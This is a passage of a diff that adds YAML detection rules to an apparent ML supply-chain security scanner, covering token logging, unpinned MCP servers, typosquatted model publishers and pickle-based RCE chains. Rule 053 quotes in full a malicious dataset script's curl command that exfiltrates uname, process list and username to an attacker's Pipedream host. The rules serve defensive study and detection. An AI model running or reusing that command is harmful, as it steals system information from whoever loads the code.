+    ML models to enable verification across trust boundary crossings. Pautsch et al.
+    (2025) specifically called for SBOM-style dependency graphs for agent/MCP packages.
+    Without provenance metadata, it is impossible to determine if a logged model artifact
+    was built from a compromised base model or poisoned training data.
+
+    '
+  remediation: 'Log model provenance metadata alongside artifacts: base model hash,
+    training data hashes, training code commit hash, dependency versions. Implement
+    model cards with machine-readable supply chain metadata (YAML frontmatter). Consider
+    model signing via Sigstore (Meiklejohn et al. 2025). Adopt ML-SBOM formats emerging
+    from CISA/NIST.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-1059
+- id: MEDUSA-MLSC-SCAN-044
+  name: huggingface-token-in-environment-log
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)print\s*\(.*(?:HF_TOKEN|HUGGINGFACE_TOKEN|hf_token|api_key)
+  - (?i)logging\.(?:info|debug|warning)\s*\(.*(?:token|api_key|secret)
+  - (?i)os\.environ\.get\s*\(['"](?:HF_TOKEN|HUGGINGFACE_TOKEN)['"]\).*print
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Hugging Face token or ML API key printed/logged — credential exposure via
+    log streams
+  description: 'Hugging Face token or ML platform API key being printed or logged
+    to output. Siddiq et al. (2026) identified CWE-259 (Hard-coded Password) as the
+    second most common weakness across all platforms: 10,097 instances on Hugging
+    Face (10.62%), 2,278 on ModelScope (10.99%), 1,699 on OpenCSG (8.20%). Credential
+    exposure via logging is distinct from but related to hard-coded credentials: tokens
+    fetched from environment variables can still be inadvertently exposed through
+    debug logging, error messages, or stdout/stderr capture in CI/CD systems. Embedded
+    Hugging Face tokens grant access to private repositories and can be extracted
+    from CI/CD logs, container runtime logs, or notebook outputs that are accidentally
+    committed to version control.
+
+    '
+  remediation: 'Remove all logging/printing of tokens and API keys. Use structured
+    logging with field-level redaction for credentials. Implement pre-commit hooks
+    (detect-secrets, git-secrets) to prevent credential exposure in committed notebooks
+    or scripts. Rotate any token that has appeared in log output. Review CI/CD log
+    retention policies for captured environment variables.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-532
+- id: MEDUSA-MLSC-SCAN-045
+  name: model-supply-chain-no-integrity-check-ci
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)dvc\s+pull\s+(?!.*--verify)
+  - (?i)dvc\s+repro\s+(?!.*--verify)
+  - (?i)make\s+download.model(?!.*sha|.*hash|.*verify)
+  file_types:
+  - '*.sh'
+  - '*.bash'
+  - Makefile
+  - '*.yaml'
+  - '*.yml'
+  message: ML model/data pulled in CI/CD without integrity verification — pipeline
+    supply chain attack surface
+  description: 'ML model or data pulled in CI/CD pipeline without integrity verification
+    (DVC pull, Makefile download-model, etc.). Kalu & Davis (2025) argue that artifacts
+    traversing trust boundaries (including CI/CD pipelines) lose registry security
+    guarantees without signing. Havryliak (2025) documented that CI/CD pipelines are
+    a key target for ML model cache poisoning — an attacker controlling a model storage
+    backend can inject malicious weights that are pulled and used in automated training
+    or evaluation runs. Vassilev et al. (NIST AI 100-2e2023) recommend cryptographic
+    hash verification of all model artifacts as a basic supply chain integrity practice.
+    DVC without --verify flag skips hash verification of pulled artifacts.
+
+    '
+  remediation: 'Use DVC with --verify flag or configure DVC to always verify hashes
+    after pull. Add explicit sha256sum verification steps in CI/CD pipelines after
+    any model download. Implement artifact signing in model storage (S3 object integrity,
+    Sigstore attestation). Treat model artifact downloads in CI/CD as security-sensitive
+    operations requiring the same controls as code dependency installation.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-345
+- id: MEDUSA-MLSC-SCAN-046
+  name: agent-tool-unverified-registration
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)langchain.*Tool\s*\([^)]*func\s*=\s*(?!lambda\s+x:\s*['"])
+  - (?i)autogen.*register_for_execution\s*\([^)]*(?:http|url|remote)
+  - (?i)crewai.*tool\s*=\s*[A-Za-z]+\s*\(\s*\)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  message: Agent tool registered from unverified external source — agent supply chain
+    tool injection risk
+  description: 'LLM agent tool registered from an external or dynamically-resolved
+    source without integrity verification. Pautsch et al. (2025) identified tool/agent
+    supply chain risks as extending all software supply chain vulnerabilities into
+    the autonomous agent context. A malicious tool registered in an agent''s tool
+    set can exfiltrate data, execute system commands, or manipulate the agent''s environment.
+    The autonomy of agents amplifies the damage: where a human user would notice unexpected
+    behavior, an agent may silently execute a malicious tool''s instructions. Agent
+    tool registries (LangChain Hub, AutoGen tools) inherit the same namesquatting
+    and rug pull risks documented for model hubs. Pautsch et al. noted that compromised
+    agent accounts cascade to all dependent agents.
+
+    '
+  remediation: 'Verify the source and integrity of all tools registered with LLM agents.
+    Pin tool package versions with hashes. Sandbox agent tool execution in restricted
+    environments. Implement tool capability declarations and permission systems. Monitor
+    agent tool calls for anomalous behavior (unexpected network calls, file system
+    access).
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-047
+  name: model-card-uncensored-tag
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)tags:\s*[\s\S]*(?:uncensored|jailbreak|unrestricted|no.?filter|remove.*safety)
+  - (?i)base_model:.*(?:llama|mistral|qwen).*\.?uncensored
+  - (?i)license:\s*(?:other|custom|proprietary).*uncensored
+  file_types:
+  - '*.md'
+  - '*.yaml'
+  - '*.yml'
+  - README.md
+  message: Model card tags indicate uncensored/jailbroken model — potential malicious
+    fine-tune or safety bypass distribution
+  description: 'Model card metadata tags indicating an uncensored, jailbroken, or
+    safety-filter-removed model variant. Meiklejohn et al. (ICML 2025) documented
+    misinformation injection via fine-tuning as a concrete ML supply chain attack:
+    models fine-tuned or uploaded to give harmful outputs on targeted topics. Stalnaker
+    et al. (2025) identified widespread licensing inconsistencies and supply chain
+    opacity in the 760K+ model corpus, with many models that are fine-tunes of restricted-license
+    base models (e.g., LLaMA) but labeled with misleading license tags. Uncensored/unrestricted
+    model variants represent a specific distribution mechanism for safety-bypass capabilities
+    that may violate base model licenses, terms of service, and introduce legal and
+    reputational risks to consumers.
+
+    '
+  remediation: 'Implement model registry allowlisting — only consume models from verified
+    publishers with appropriate licensing. Scan model card metadata for risk-indicating
+    tags as part of supply chain governance. Validate that base model license allows
+    the derivative work. Implement organizational policy governing which model tags
+    are permissible in production systems.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-345
+- id: MEDUSA-MLSC-SCAN-048
+  name: onnx-custom-operator-domain
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)onnxruntime\.SessionOptions\s*\(\s*\).*register_custom_ops_library
+  - (?i)custom_op_domain\s*=\s*['"][^'"]+['"]
+  - (?i)ort\.SessionOptions.*add_custom_op_library_path
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: ONNX custom operator library registered — potential code execution via
+    ONNX custom ops
+  description: 'ONNX Runtime custom operator library registration, enabling native
+    code execution during ONNX model inference. While ONNX format itself is generally
+    safer than pickle (no arbitrary Python execution), custom operator libraries are
+    compiled native code (.so/.dll) that executes at inference time. A malicious custom
+    operator library can achieve arbitrary code execution equivalent to a pickle payload
+    while bypassing Python-level scanners. Parida et al. (2025) noted ONNX as the
+    safest format for cross-platform portability, but specifically highlighted that
+    conversion from native formats can introduce issues — custom operator requirements
+    are a common reason models require non-standard ONNX loading. Zhao et al. (ASE
+    ''24) classified ONNX as ''Secure'' in their taxonomy, but this classification
+    assumes standard ONNX without custom ops.
+
+    '
+  remediation: 'Audit all custom operator libraries before registration with ONNX
+    Runtime. Verify SHA-256 hash of .so/.dll custom op libraries. Prefer ONNX models
+    that do not require custom operators. If custom ops are unavoidable, build them
+    from source with a verified build pipeline rather than loading pre-compiled binaries
+    from untrusted sources.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-114
+- id: MEDUSA-MLSC-SCAN-049
+  name: model-fine-tune-from-unverified-base
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)trainer\s*=\s*Trainer\s*\([^)]*model\s*=\s*AutoModel\.from_pretrained
+  - (?i)model\.train\s*\(\s*\).*from_pretrained\s*\(['"][^'"]+['"]\)
+  - (?i)SFTTrainer\s*\([^)]*model_name_or_path\s*=\s*['"][^'"]{5,}['"]
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  message: Fine-tuning from base model without integrity verification — compromised
+    base model propagates to fine-tuned descendants
+  description: 'Model fine-tuning initiated from a base model loaded without integrity
+    verification. Stalnaker et al. (2025) documented Supply Chain Provenance Opacity
+    as a key attack surface: models fine-tuned from a compromised base model propagate
+    the compromise to all downstream fine-tuned variants. The non-linear supply chain
+    structure (fine-tuning, quantization, distillation, multi-model architectures)
+    means a single compromised base model like Llama or Mistral could cascade to hundreds
+    of fine-tuned descendants. Meiklejohn et al. (ICML 2025) confirmed training data
+    poisoning as a concrete attack: a model trained on poisoned data introduces backdoors
+    or biases that are inherited through subsequent fine-tuning. Vassilev et al. (NIST
+    AI 100-2e2023) classify backdoor poisoning at pre-training/fine-tuning stage as
+    a supply chain attack.
+
+    '
+  remediation: 'Verify the integrity of base models before initiating fine-tuning:
+    check commit hash, verify publisher signature, and validate against a known-good
+    checksum. Record base model hash in training metadata and model card. Use only
+    verified, signed base models from official publishers. Implement provenance tracking
+    in fine-tuning pipelines.
+
+    '
+  owasp_llm: LLM04:2025
+  cwe: CWE-345
+- id: MEDUSA-MLSC-SCAN-050
+  name: mcp-config-unverified-server
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)"command"\s*:\s*"(?:npx|uvx|node|python)"[^}]*"args"\s*:\s*\[
+  - (?i)mcp.*config.*json.*"server".*"url"\s*:\s*"https?://
+  - (?i)\.mcp\.json.*"command".*(?:npx|uvx)
+  file_types:
+  - '*.json'
+  - .mcp.json
+  - mcp.json
+  - '*.yaml'
+  - '*.yml'
+  message: MCP server configuration without version pinning or hash verification —
+    rug pull attack surface
+  description: 'MCP (Model Context Protocol) server configuration specifying a server
+    to install via npx, uvx, or similar without pinned version or hash verification.
+    Pautsch et al. (2025) named MCP Server Rug Pull as a key supply chain risk: an
+    agent or MCP server published to a registry is later modified (or replaced) by
+    the original publisher or an attacker who compromised the publisher. Autonomous
+    agents that consume the compromised MCP server inherit the attack. The npm leftpad
+    incident pattern applies: a popular MCP server package can be modified to include
+    malicious code after widespread adoption, cascading across all dependent pipelines.
+    Pautsch et al. noted that a single maintainer account controlling many agents
+    creates a concentrated attack target analogous to npm''s maintainer concentration
+    problem documented by Zimmermann et al.
+
+    '
+  remediation: 'Pin MCP server versions to specific versions with SHA integrity hashes.
+    Use lock files (package-lock.json for npm, uv.lock for uvx) to prevent unexpected
+    updates. Audit MCP server source code before deployment. Prefer MCP servers from
+    verified publishers with signed packages. Monitor for unexpected updates to configured
+    MCP server versions.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-051
+  name: huggingface-retrieval-rag-pickle-chain
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)retrieval_rag\.py.*pickle\.load
+  - (?i)from_pretrained\s*\([^)]*RagRetriever
+  - (?i)RagSequenceForGeneration\.from_pretrained.*_name_or_path
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: RAG retriever pipeline uses pickle.load — _name_or_path config redirect
+    enables RCE via RAG config poisoning
+  description: 'RAG (Retrieval-Augmented Generation) retriever pipeline loading via
+    Transformers library that uses pickle.load internally. Ding et al. (2025) documented
+    a confirmed attack chain: the Transformers library''s retrieval_rag.py contains
+    pickle.load, which when combined with a malicious config.json where _name_or_path
+    redirects to an attacker-controlled repository, enables Remote Code Execution.
+    CONFIGSCAN confirmed hauson-fan/RagRetriever and HuggingWorm/RagRetriever as real-world
+    malicious configurations exploiting this exact chain. This is a compound attack:
+    config file poisoning (non-weight attack vector) combined with an existing pickle.load
+    in the Transformers library achieves RCE without requiring a malicious model weight
+    file. Existing model scanners miss this because they focus on model weights, not
+    configuration files.
+
+    '
+  remediation: 'Audit config.json _name_or_path values before loading RAG retrievers.
+    Use CONFIGSCAN (Ding et al. 2025) to scan configuration files. Ensure transformers
+    library is updated (Hugging Face has been notified of this vulnerability chain).
+    Verify that _name_or_path matches the repository from which you are loading the
+    model. Never load RAG configurations from untrusted sources.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-610
+- id: MEDUSA-MLSC-SCAN-052
+  name: model-quantization-gguf-unsafe-load
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)llama_cpp\.Llama\s*\([^)]*model_path\s*=\s*(?!local_path|os\.path)
+  - (?i)from_pretrained.*gguf.*(?!revision\s*=\s*['"][a-f0-9]{40})
+  - (?i)AutoModelForCausalLM\.from_pretrained.*gguf_file\s*=
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: GGUF quantized model loaded without integrity verification — quantized
+    model supply chain risk
+  description: 'GGUF quantized model (llama.cpp format) loaded without integrity verification.
+    GGUF models are a fast-growing format for quantized LLMs and represent a distinct
+    supply chain attack surface. While GGUF format is binary but not pickle-based,
+    malicious GGUF files can contain corrupt tensor data designed to trigger bugs
+    in the llama.cpp C++ parser, potentially leading to buffer overflows or memory
+    corruption. The quantized model ecosystem (GGUF, AWQ, GPTQ, ExLlamaV2) distributes
+    many third-party quantizations of base models from unofficial publishers. Meiklejohn
+    et al. (ICML 2025) documented that namesquatting is not limited to base models
+    — quantized variants with misleading publisher names are equally viable attack
+    vectors. Stalnaker et al. (2025) found the Hugging Face supply chain complex with
+    quantization creating additional dependency hops.
+
+    '
+  remediation: 'Download GGUF files from official publishers or verified quantizers
+    with established track records. Verify SHA-256 hash of GGUF files before loading.
+    Use models from the official Hugging Face org for the base model (e.g., TheBloke
+    was the dominant quantizer but has been succeeded by official publisher quantizations).
+    Keep llama.cpp updated to latest version to benefit from parser security fixes.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-053
+  name: dataset-script-network-callback
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)class\s+\w+Dataset.*:\s*[\s\S]{0,500}requests\.(?:get|post)\s*\(
+  - (?i)def\s+_generate_examples.*urllib\.request
+  - (?i)_URLS\s*=\s*\{[^}]*\}.*(?:subprocess|os\.system)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Dataset loading script makes network callbacks — potential system information
+    exfiltration payload
+  description: 'Dataset loading script (HuggingFace Datasets-format) contains network
+    callbacks (requests.get, urllib.request) in data generation code. Zhao et al.
+    (ASE ''24) discovered and documented the real-world malicious dataset loading
+    script ''Yash2998db/stan_small'' which ran subprocess.check_output(''(uname -a;
+    ps auxww) | curl -s https://eoxvp5idbpacu69.m.pipedream.net/$(whoami) --data-binary
+    @-'', shell=True), exfiltrating system information (OS version, process list,
+    username) to an attacker''s Pipedream server on dataset load. Zhao et al. found
+    9 malicious dataset loading scripts total. Network callbacks in _generate_examples()
+    methods are particularly suspicious as they are called for every data point loaded,
+    potentially enabling exfiltration at scale.
+
+    '
+  remediation: 'Never use datasets.load_dataset() with trust_remote_code=True on untrusted
+    datasets. Audit dataset loading scripts for any network calls before enabling
+    trust_remote_code. Use only curated, verified dataset scripts. Implement egress
+    filtering on data loading environments. Report suspicious dataset loading scripts
+    to Hugging Face security team.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-200
+- id: MEDUSA-MLSC-SCAN-054
+  name: model-mirror-without-signing-verification
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)ENDPOINT\s*=\s*['"]https?://(?!huggingface\.co|hf\.co)[^'"]+['"]
+  - (?i)HF_ENDPOINT\s*=\s*['"]https?://(?!huggingface\.co)[^'"]+['"]
+  - (?i)hf_hub.*endpoint.*(?!huggingface\.co)
+  file_types:
+  - '*.py'
+  - '*.sh'
+  - '*.bash'
+  - '*.yaml'
+  - '*.yml'
+  message: Custom Hugging Face endpoint configured — model mirror without signing
+    verification loses registry security guarantees
+  description: 'Custom Hugging Face Hub endpoint configured, routing model downloads
+    through a non-official mirror or proxy. Kalu & Davis (2025) argue that artifacts
+    traversing trust boundaries (mirrors, corporate proxies, re-hosting) lose registry
+    security guarantees — exactly the scenario when HF_ENDPOINT is configured to an
+    internal mirror. Siddiq et al. (2026) documented AiTM cache poisoning as a real
+    attack scenario (S3): attacker intercepts or tampers with model distribution channel
+    during transfer or dependency resolution via compromised mirrors or proxy layers.
+    Without signing verification (fewer than 2% of HF models are signed per Meiklejohn
+    et al. 2025), a mirror cannot prove the authenticity of served models, enabling
+    substitution attacks.
+
+    '
+  remediation: 'If using an internal mirror of Hugging Face Hub, implement artifact
+    signing and verification at the mirror boundary. Verify SHA-256 hashes of models
+    served by internal mirrors against official Hugging Face Hub checksums. Implement
+    Sigstore verification for models that support it. Ensure mirror synchronization
+    integrity is monitored and any substitution is detected.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-055
+  name: ml-sbom-absent-in-deployment
+  severity: LOW
+  category: ml_supply_chain
+  patterns:
+  - (?i)docker.*(?:pytorch|tensorflow|transformers|cuda)(?!.*sha256|.*--verify)
+  - (?i)FROM\s+(?:pytorch|tensorflow|huggingface|nvidia)/[^\s]+(?!@sha256:)
+  - (?i)image:\s*(?:pytorch|tensorflow|huggingface)/[^\s]+(?!@sha256:)
+  file_types:
+  - Dockerfile
+  - '*.dockerfile'
+  - '*.yaml'
+  - '*.yml'
+  message: ML Docker base image not pinned to digest — container supply chain integrity
+    gap
+  description: 'ML Docker base image specified by tag rather than SHA256 digest, creating
+    supply chain integrity risk. Mutable Docker tags (pytorch/pytorch:latest, tensorflow/tensorflow:2.13.0)
+    can be updated by the publisher or compromised, causing different images to be
+    pulled on subsequent builds. Kalu & Davis (2025) argue that the same trust boundary
+    problem affecting package registries applies equally to container registries:
+    a mirror or registry proxy can substitute a different layer without detection
+    unless the digest is verified. Meiklejohn et al. (ICML 2025) extended supply chain
+    integrity concerns to all ML artifacts — container images are part of the ML supply
+    chain as they contain ML framework versions, CUDA drivers, and pre-installed model
+    artifacts.
+
+    '
+  remediation: 'Pin Docker base images to SHA256 digests: FROM pytorch/pytorch@sha256:abc123...
+    Use docker image inspect to get the digest for a known-good image. Implement container
+    image scanning (Trivy, Snyk Container) as part of ML CI/CD. Generate SBOMs for
+    container images (syft, docker sbom) as part of the ML supply chain documentation.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-056
+  name: pymilo-json-alternative-not-used
+  severity: LOW
+  category: ml_supply_chain
+  patterns:
+  - (?i)from\s+sklearn\..*import.*(?:LinearRegression|LogisticRegression|RandomForest|SVM|GradientBoosting)
+  - (?i)sklearn\..*fit\s*\(.*\).*(?:pickle\.dump|joblib\.dump)
+  - (?i)model\.fit\s*\(.*\).*pickle\.dump\s*\(model
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: scikit-learn model persisted with pickle/joblib — PyMilo JSON serialization
+    available as safe alternative
+  description: 'scikit-learn model being persisted using unsafe pickle or joblib serialization
+    instead of transparent JSON alternatives. Rostami et al. (2024) developed PyMilo
+    specifically to address this gap: a Python library for transparent, reliable,
+    and safe ML model I/O by serializing traditional ML models (scikit-learn) into
+    human-readable, non-executable JSON format. PyMilo eliminates the arbitrary code
+    execution attack vector for traditional ML models while preserving exact model
+    behavior. Parida et al. (2025) found Pickle and Joblib to be the most challenging
+    to integrate AND the most insecure formats — making migration to JSON-based PyMilo
+    beneficial for both security and integration. PyMilo is available at https://github.com/openscilab/pymilo.
+
+    '
+  remediation: 'Use PyMilo (pip install pymilo) for scikit-learn model serialization
+    instead of pickle or joblib. PyMilo produces transparent JSON that can be audited
+    for unexpected content. For deep learning models (not supported by PyMilo), use
+    safetensors format. Migration is a drop-in: replace pickle.dump(model, f) with
+    pymilo.Export(model, file_path).
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-057
+  name: model-access-token-passed-to-subprocess
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)subprocess\.(?:run|call|Popen)\s*\([^)]*(?:HF_TOKEN|hf_token|HUGGINGFACE_TOKEN)
+  - (?i)os\.system\s*\(.*(?:HF_TOKEN|hf_token|api_key)
+  - (?i)shell\s*=\s*True.*(?:HF_TOKEN|hf_token|token)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.sh'
+  message: ML API token passed to subprocess/shell — token exposure via process list
+    and shell history
+  description: 'Hugging Face token or ML API key passed directly to a subprocess or
+    shell command. Tokens passed as command-line arguments are visible to other processes
+    via /proc/ pseudo-filesystem, are captured in shell history files, and appear
+    in process monitoring tools. Siddiq et al. (2026) found CWE-259 (hard-coded passwords)
+    and credential exposure among the most prevalent weaknesses: 10,097 instances
+    on HF (10.62%), with Hugging Face tokens granting access to private repositories
+    creating an amplified supply chain risk. Passing tokens via shell commands in
+    ML training scripts is common in notebook-to-production migrations where developers
+    copy interactive commands directly into automation scripts. Zhao et al. (ASE ''24)
+    classified token/credential exposure as part of the sensitive information theft
+    category of malicious model payloads.
+
+    '
+  remediation: 'Pass API tokens via environment variables, not command-line arguments.
+    Use os.environ for passing credentials to subprocesses: env=dict(os.environ, HF_TOKEN=...).
+    Never include tokens in shell commands that appear in process listings. Use huggingface_hub.login()
+    for authentication rather than passing tokens to CLI tools. Rotate any token that
+    has been passed as a command-line argument.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-214
+- id: MEDUSA-MLSC-SCAN-058
+  name: model-format-conversion-without-validation
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)convert_hf_to_gguf\.py
+  - (?i)optimum.*export.*onnx\s*(?!--atol|--validate)
+  - (?i)torch\.onnx\.export\s*\([^)]*\)(?!.*onnx\.checker)
+  file_types:
+  - '*.py'
+  - '*.sh'
+  - '*.bash'
+  message: Model format conversion without validation — converted model integrity
+    not verified
+  description: 'Model format conversion (to GGUF, ONNX, safetensors) without output
+    validation. Parida et al. (2025) specifically noted that ONNX conversion from
+    native formats can introduce accuracy degradation issues and potentially introduce
+    structural problems. Model format conversion is a non-trivial transformation —
+    a malicious actor controlling the conversion tooling or a compromised conversion
+    script could introduce subtle weight modifications during conversion that survive
+    format boundaries. Converting between formats without running onnx.checker.check_model()
+    (for ONNX) or safetensors validation (for safetensors) means the converted model''s
+    integrity is unverified. This is particularly relevant as many GGUF models on
+    Hugging Face are third-party conversions where conversion script provenance is
+    unknown.
+
+    '
+  remediation: 'Run format-specific validation after conversion: onnx.checker.check_model()
+    for ONNX, safetensors.safe_open() validation for safetensors. Compare model output
+    on a test input before and after conversion to verify behavioral equivalence.
+    Sign converted model artifacts and publish conversion provenance. Use official
+    conversion scripts from trusted publishers (e.g., huggingface/transformers convert_*.py).
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-345
+- id: MEDUSA-MLSC-SCAN-059
+  name: agent-abandoned-stale-version
+  severity: LOW
+  category: ml_supply_chain
+  patterns:
+  - (?i)langchain.*(?:0\.0\.[0-9]{1,2}|0\.1\.[0-9])['"]
+  - (?i)openai.*(?:0\.[0-9]+\.[0-9]+)['"].*#.*deprecated
+  - (?i)transformers.*(?:3|4\.[0-9]\.[0-9])['"].*#\s*(?:old|legacy|deprecated)
+  file_types:
+  - '*.txt'
+  - '*.cfg'
+  - '*.toml'
+  - requirements*.txt
+  message: Stale/deprecated ML framework version pinned — abandoned version may contain
+    unpatched vulnerabilities
+  description: 'Stale or deprecated ML framework version explicitly pinned. Pautsch
+    et al. (2025) identified Stale/Abandoned Agent Risk as a distinct supply chain
+    concern: agents and tools that stop updating remain discoverable and appear healthy
+    while accumulating unpatched vulnerabilities. This applies equally to ML framework
+    dependencies: teams that pin old LangChain (0.0.x), old OpenAI SDK, or old Transformers
+    versions to avoid migration work inherit all CVEs in those versions without receiving
+    patches. Kalu & Davis (2025) note that stale dependencies are particularly dangerous
+    at trust boundaries — an internal mirror propagating stale versions creates a
+    concentration point for known-vulnerable packages. The ML supply chain''s rapid
+    evolution means even 6-month-old framework versions may have critical security
+    patches.
+
+    '
+  remediation: 'Establish a regular dependency update cadence (quarterly minimum)
+    for ML frameworks. Subscribe to security advisories for core ML packages (PyPI
+    advisory, GitHub dependabot alerts). Maintain a tested upgrade path for major
+    ML framework version bumps. Remove deprecated/EOL version pins and document the
+    security motivation for any version pin.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-1188
+- id: MEDUSA-MLSC-SCAN-060
+  name: model-hub-typosquatting-org-name
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)from_pretrained\s*\(['"](?:meta.llama|metaIlama|meta1lama|mistral-?ai-?official|deepseek.ai.official)['"]
+  - (?i)from_pretrained\s*\(['"](?:google-?official|googIe|g00gle-?ai|microsoft-?ai-?official)['"]
+  - (?i)huggingface\.co/(?:mistral-?ai-?team|deepseek-?official|qwen-?ai|alibaba-?qwen)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  - '*.txt'
+  message: Potential model hub organization name typosquat — verify exact publisher
+    identity before loading
+  description: 'Potential typosquatting of official ML publisher organization names
+    on model hubs. Meiklejohn et al. (ICML 2025) documented real-world namesquatting
+    attacks on Hugging Face where attackers create accounts mimicking official organizations
+    to distribute malicious models. Official organization names: meta-llama, mistralai,
+    deepseek-ai, Qwen (Alibaba), google, microsoft. Typosquats observed in the wild
+    use hyphen variations, zero/letter substitutions (g00gle, googIe), suffix additions
+    (-official, -team, -ai), and whitespace variants. Fewer than 2% of Hugging Face
+    models use cryptographic signing making visual name inspection the only defense
+    available to most users. Meiklejohn et al. confirmed traditional antivirus cannot
+    detect malicious ML models, making org-level typosquatting particularly dangerous
+    as users trust the publisher identity.
+
+    '
+  remediation: 'Maintain an organizational allowlist of verified publisher names:
+    meta-llama, mistralai, deepseek-ai, Qwen, google, microsoft, openai. Reject any
+    from_pretrained() call not matching allowlisted organizations without explicit
+    security review. Cross-reference publisher names against official organization
+    websites. Implement automated typosquat detection using edit-distance checks against
+    known legitimate publisher names.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-345
